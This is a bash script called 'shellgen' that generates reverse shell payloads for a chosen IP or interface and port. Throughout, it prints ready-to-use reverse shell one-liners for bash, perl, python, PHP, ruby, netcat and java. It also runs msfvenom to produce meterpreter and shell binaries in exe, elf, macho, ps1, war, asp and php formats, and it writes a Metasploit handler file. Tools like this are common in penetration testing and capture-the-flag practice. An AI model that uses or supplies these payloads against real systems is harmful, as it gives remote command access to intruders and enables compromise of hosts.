#!/bin/bash


##########################Author##############################
#							     #
#		3nt3r ~~~ https://lukashku.com		     #
#							     #
##############################################################

# Different Colors
RED="\033[01;31m" 
GREEN="\033[01;32m"    
YELLOW="\033[01;33m"  
BLUE="\033[01;34m"
PINK="\033[01;95m"
RESET="\033[00m" 


###Displays Header
header () {

echo -e "  ${BLUE} ___  _   _  ____  __    __    ___  ____  _  _ ${RESET}"
echo -e "  ${BLUE}/ __)( )_( )( ___)(  )  (  )  / __)( ___)( \\( )${RESET}"
echo -e "  ${BLUE}\__ \ ) _ (  )__)  )(__  )(__( (_-. )__)  )  ( ${RESET}"
echo -e "  ${BLUE}(___/(_) (_)(____)(____)(____)\___/(____)(_)\_)${RESET}"

}

###Checks if msfvenom is installed
if [[ ! -n "$( \which msfvenom )" ]]; then
  echo -e " ${RED}Oh no, Couldn't find msfvenom${RESET}" >&2
  exit 0
fi


display_usage() { 
	###Displays Header
	header 
	
	echo -e "${PINK}\n  Usage:\n  ./shellgen <ip/interface name> <listen port>${RESET}" 
	echo -e "${PINK}  ./shellgen <ip/interface name> <listen port> <shell type>${RESET}\n"
	echo "Example usage:"
	echo -e "${PINK}  ./shellgen 10.10.10.10 9999${RESET}"
	echo -e "${PINK}  ./shellgen eth0 9999 bash${RESET}\n "
	
	echo "Shell Options:"
	echo -e "${PINK}  [bash, sh] [perl, pl] [python, py] [php] [ruby, rb] [netcat, nc] [java] [msfvenom, msf]${RESET}\n "

	echo -e "  ${YELLOW}Available Interfaces:${RESET}"
	echo ""
	#Display interfaces
	interfaces=$(ip -f inet -br addr show | grep -v 127.0.0.1 | sed  's/@.....//g')
	echo -e "  ${YELLOW}$interfaces${RESET}"
	echo ""
	} 

	### If less than two arguments supplied, display usage 
	if [  $# -le 1 ] 
	then 
		display_usage
		exit 1
	fi 

#Takes the chosen msfvenom payload and creates an .rc file to be used with msfconsole to start a multi/handler
handler () {
	echo "use exploit/multi/handler" > handler.rc
	echo "set payload $payload" >> handler.rc
	echo "set lhost $1" >> handler.rc
	echo "set lport $2" >> handler.rc
	echo "exploit" >> handler.rc
	echo ""
	echo -e "[*] ${GREEN}File 'handler.rc' created. Type 'msfconsole -r handler.rc' to start the handler${RESET}"
	echo ""
}
#Generates a few msfvenom commands that all had similar payloads
#Separates if user chose a meterpreter payload or not
payloads () {
	
	if [ "$metChoice" == "y" ]; then

		echo -e  "[*] ${GREEN}Generating payload: msfvenom -p $payloadType/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f $fileType > shell.$ext${RESET}"
		echo ""
		msfvenom -p $payloadType/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f $fileType > shell.$ext
		payload="$payloadType/meterpreter/reverse_tcp"
		handler $1 $2 $payload

	elif [ "$metChoice" == "n" ]; then

		echo -e "[*] ${GREEN}Generating payload: msfvenom -p $payloadType/shell_reverse_tcp LHOST=$1 LPORT=$2  -f $fileType > shell.$ext${RESET}"
		msfvenom -p $payloadType/shell_reverse_tcp LHOST=$1 LPORT=$2  -f $fileType > shell.$ext
		payload="$payloadType/shell_reverse_tcp"
		handler $1 $2 $payload
	else
		echo -e "\n[*] ${RED}Oh no, something happened...${RESET}\n"	
	fi
}

shells () {

	case "$choice" in
	
	1 | bash | sh )#Bash Shell
		echo -e "[*]\n ${GREEN}bash -i >& /dev/tcp/$1/$2 0>&1${RESET}"
		echo ""
		echo -e "[*]\n ${GREEN}0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196${RESET}"
		;;
	2 | perl | pl )#Perl Shell
		echo -e "${GREEN}perl -e 'use Socket;$i=\"$1\";$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'${RESET}"
		;;
	3 | python | py )#Python Shell
		echo -e "${GREEN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${RESET}"
		;;
	4 | php )#PHP Shell
		echo -e "[*]\n ${GREEN}php -r '$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${RESET}"
		echo ""
                echo -e "[*]\n ${GREEN}<?php shell_exec(\"/bin/bash -c 'bash -i > /dev/tcp/$1/$2 0>&1'\"); ?>${RESET}"
		;;
	5 | ruby | rb )#Ruby Shell
		echo -e "${GREEN}ruby -rsocket -e'f=TCPSocket.open(\"$1\"$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${RESET}"
		;;
	6 | netcat | nc )#Netcat Shells
		echo -e "[*]\n ${GREEN}nc -e /bin/sh $1 $2${RESET}"
		echo ""
		echo -e "[*]\n ${GREEN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f${RESET}"
		echo ""
		echo -e "[*]\n ${GREEN}ncat $1 $2 -e /bin/bash${RESET}"
		;;
	7 | java )#Java Shell
		echo -e "${GREEN}r = Runtime.getRuntime()${RESET}"
		echo -e "${GREEN}p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])${RESET}"
		echo -e	"${GREEN}p.waitFor()\"${RESET}"
		;;
	8 | msfvenom | msf )#MSFVenom Payload Options
		echo -e "${YELLOW}  #####Type#####${RESET}"
		echo -e "${YELLOW}  >> ASP** [.asp]${RESET}"
		echo -e "${YELLOW}  >> ASPX** [.aspx]${RESET}"
		echo -e "${YELLOW}  >> Bash [.sh]${RESET}"
		echo -e "${YELLOW}  >> Java [.jsp]${RESET}"
		echo -e "${YELLOW}  >> Linux** [.elf]${RESET}"
		echo -e "${YELLOW}  >> OSX** [.macho]${RESET}"
		echo -e "${YELLOW}  >> Perl [.pl]${RESET}"
		echo -e "${YELLOW}  >> PHP** [.php]${RESET}"
		echo -e "${YELLOW}  >> Powershell** [.ps1]${RESET}"
		echo -e "${YELLOW}  >> Python [.py]${RESET}"
		echo -e "${YELLOW}  >> Tomcat [.jsp]${RESET}"
		echo -e "${YELLOW}  >> Windows** [.exe]${RESET}"
		echo ""
		echo -e "${BLUE}  ##Architecture type is only required for type: Linux, OSX, Windows##${RESET}"
		echo -e "${BLUE}  '**' Indicates meterpreter compatibility${RESET}"
		echo ""
		#Ask user for various input
		read -p $'  \e[01;33mEnter <type> <meterpreter(y/n)> <architecture(x86/x64)>\e[0m ' payloadType metChoice arch 
		
		case "${payloadType,,}" in 

		asp)###Generates asp reverse shell
			ext="asp"
			fileType="asp"
			payloadType="windows"
			#Chooses payload based on user's meterpreter choice
			case "${metChoice,,}" in

			y)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			n)
				payloads $1 $2 $payloadType $fileType $ext 
				;;
			*)
				echo -e "\n[*] ${RED}Oh no, that wasn't a y/n answer.${RESET}\n"
				;;	
			esac
			;;
		aspx)###Generates aspx reverse shell
			ext="aspx"
			fileType="aspx"
			payloadType="windows"

			case "${metChoice,,}" in

			y) 
				payloads $1 $2 $payloadType $fileType $ext
				;;
			n)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			*)
				echo -e "\n[*] ${RED}oh no, that wasn't a y/n answer.${RESET}\n"
				;;
			esac
			;;
		bash | sh )###Generates bash reverse shell
			echo -e "[*] ${GREEN}Generating payload: msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2${RESET}"
			echo ""
			msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2 
			payload="/cmd/unix/reverse_bash"
			handler $1 $2 $payload
			;;

		java)###Java reverse shell
			echo -e "[*] ${GREEN}Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > shell.jsp${RESET}"
			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > shell.jsp
			payload="java/jsp_shell_reverse_tcp"
			handler $1 $2 $payload
			;;
		
		linux | elf )###Linux reverse shell binary 

			#Checks if architecture is variable is empty. If it is then defaults to x86
			if [ -z "$arch" ]; then
				arch="x86"
			#If user input matches a support architecture then command keeps that architecture
			elif [ "$arch" == "x86" ] || [ "$arch" == "x64" ]; then
				arch=$arch
			#Error handling for an improper architcture
			else
				echo -e "\n[*] ${RED}Oh no, not a proper architecture${RESET}\n"	
				exit 0
			fi
			ext="elf"
			fileType="elf"
			payloadType=$payloadType/$arch

			case "${metChoice,,}" in

			y)	
				payloads $1 $2 $payloadType $fileType $ext
				;;
			n)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			*)
				echo -e "\n[*] ${RED}Oh no, that wasn't a y/n answer.${RESET}\n"
				;;
			esac
			;;
		osx)###OSX Reverse shell
			###Cehcks if architecture value is empty, defaults to x64
			if [ -z "$arch" ]; then
				arch="x64"
			###Checks if user supplied architecture is valid	
			elif [ "$arch" == "x86" ] || [ "$arch" == "x64" ]; then
				arch=$arch
			###Error handling
			else
				echo -e "\n[*] ${RED}Oh no, not a proper architecture${RESET}\n"
			fi

			ext="macho"
			fileType="macho"
			payloadType="osx/$arch"

			case "${metChoice,,}" in

			y) 
				if [ "$arch" == "x86" ]; then
					echo ""
					echo -e "[*] ${YELLOW}x86 is not compatible with meterpreter on OSX, defaulting to x64${RESET}"
					payloadType="osx/x64"
					payloads $1 $2 $payloadType $fileType $ext
				else
					payloads $1 $2 $payloadType $fileType $ext
				fi
				;;
			n)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			*)
				echo -e "\n[*] ${RED}Oh no, that wasn't a y/n answer.${RESET}\n"
				;;
			esac
			;;

		perl | pl )
			ext="pl"
			fileType="raw"

			echo -e "[*] ${GREEN}Generating payload: msfvenom -p cmd/unix/reverse_perl LHOST=$1 LPORT=$2 -f raw > shell.pl${RESET}"
			msfvenom -p cmd/unix/reverse_perl LHOST=$1 LPORT=$2 -f raw > shell.pl
			payload="cmd/unix/reverse_perl"
			handler $1 $2 $payload
			;;

		php)

			case "${metChoice,,}" in
				
			y)	
				echo -e "[*] ${GREEN}Generating payload: msfvenom -p php/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f raw > shell.php${RESET}"
				msfvenom -p php/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 -f raw > shell.php
				payload="php/meterpreter_reverse_tcp"
				handler $1 $2 $payload
				;;
			n)
				echo -e "[*] ${GREEN}Generating payload: msfvenom -p php/reverse_php LHOST=$1 LPORT=$2 -f raw > shell.php${RESET}"
				msfvenom -p php/reverse_php LHOST=$1 LPORT=$2 -f raw > shell.php
				payload="php/reverse_tcp"
				handler $1 $2 $payload
				;;

			*)
				echo -y "\n[*] ${RED}Oh no, that wasn't a y/n answer.${RESET}\n"
				;;
			esac
			;;

		powershell | ps1  ) 

			if [ -z "$arch" ]; then
				payloadType="windows"
			elif [ "$arch" == "x86" ]; then
				payloadType="windows"
			elif [ "$arch" == "x64" ]; then
				payloadType="windows/x64"
			else
				echo -e "\n[*] ${RED}Oh no, not a valid architecture${RESET}\n"
			fi
			ext="ps1"
			fileType="psh"

			case "${metChoice,,}" in

			y)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			n)
				payloads $1 $2 $payloadType $fileType $ext
				;;
			*)
				echo -e "\n[*] ${RED}Oh no, that wasn't a y/n answer.${RESET}\n"
				;;
			esac
			;;

		python | py )
			#Asks user for Operating System type
			read -p $'\e[01;33mWindows(W) or Linux(L)?\e[0m ' system

			case "${system,,}" in

			w)#Windows shell
				echo -e "[*] ${GREEN}Generating payload: msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2  -f python >shell.py${RESET}"
				msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2 -f python > shell.py
				payload="windows/shell_reverse_tcp"
				handler $1 $2 $payload
				;;
			l)#Linux shell
				echo -e "[*] ${GREEN}Generating payload: msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw > reverse.py${RESET}"
				msfvenom -p cmd/unix/reverse_python LHOST=$1 LPORT=$2 -f raw > reverse.py
				payload="/cmd/unix/reverse_python"
				handler $1 $2 $payload
				;;
			*)#Error handling
				echo -e "\n[*] ${RED}Oh no, you didn't enter W/L${RESET}\n"
				;;
			esac
			;;
		
		tomcat | jsp )
			echo -e "[*] ${GREEN}Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f war > shell.war${RESET}"
                        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f war > shell.war
                        payload="java/jsp_shell_reverse_tcp"
                        handler $1 $2 $payload
                        ;;


		windows | exe )
			ext="exe"
			fileType="exe"
			#Checks architecture input, if empty then defaults to x86
			if [ -z "$arch" ]; then
				arch="x86"

			#If architecture is valid then keeps user input
			elif [ "$arch" == "x86" ] || [ "$arch" == "x64" ]; then
				arch=$arch

			#Error handling for invalid architecture	
			else
				echo -e "\n[*] ${RED}Oh no, not a valid architecutre${RESET}\n"
				exit 0
			fi
			case "${metChoice,,}" in

			y) 
				if [ "$arch" == "x86" ]; then
					payloads $1 $2 $payloadType $fileType $ext
					exit 0
				else
					payloadType=$payloadType/$arch
					payloads $1 $2 $payloadType $fileType $ext
				fi
				;;
			n)

				echo -e "[*] ${GREEN}Generating Payload: msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f exe > shell.exe${RESET}"
				msfvenom -p windows/shell/reverse_tcp LHOST=$1 LPORT=$2 -f exe > shell.exe
				payload="windows/shell/reverse_tcp"
				handler $1 $2 $payload
				;;
			*)
				echo -e "\n[*]${RED}Oh no, you didn't answer y/n${RESET}\n"
				;;
			esac
			;;

		
		*)
			echo -e "\n[*} ${RED}Oh no, not a valid option${RESET}\n"
			;;
	
		esac
		;;
	*)
		echo -e  "\n[*] ${RED}Oh no, not a valid option${RESET}\n"
		;;	
	esac
	
}


ip=""
for file in /sys/class/net/*;
do
	###Gets the name of the interface
	newfile=$(echo $file | awk -F/ '{print $NF}')
	###Checks if user input is a valid interface
	if [ "$1" == "$newfile" ]; then
		#Gets IP Address from interface
		ip=$(ip -f inet -br addr show | grep $1 | awk '{print $3}' | sed 's/\/.*//')
	#Checks that IP input by user is valid	
	elif [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
		ip=$1
	else
		continue
	fi
done

###Checks for valid ip/interface
if [ -z "$ip" ]; then
	echo -e "\n[*] ${RED}Invalid ip address/interface name.${RESET}\n"
	exit 0
else
	true
fi

###Checks for valid port
if [ "$2" -ge 1 ] && [ "$2" -le 65535 ]; then
	true
else
	echo -e "\n[*] ${RED}Oh no, invalid port number${RESET}\n"
	exit 0
fi

###Checks if user input a 3rd command line argument
if [ -z "$3" ]; then
        #Print header
        header
        #Prints Choices
        echo ""
        echo -e "${YELLOW}[1] Bash${RESET}"
        echo -e "${YELLOW}[2] Perl${RESET}"
        echo -e "${YELLOW}[3] Python${RESET}"
        echo -e "${YELLOW}[4] PHP${RESET}"
        echo -e "${YELLOW}[5] Ruby${RESET}"
        echo -e "${YELLOW}[6] Netcat${RESET}"
        echo -e "${YELLOW}[7] Java${RESET}"
        echo -e "${YELLOW}[8] MSFvenom Menu"${RESET}
        echo ""
	
        #Asks users for input
        read -p $'\e[01;33mEnter your choice:\e[0m ' choice
        echo ""
	shells $ip $2 $choice
	
else
	header
	echo ""
	choice="${3,,}"
	shells $ip $2 $choice
	echo ""
fi
		
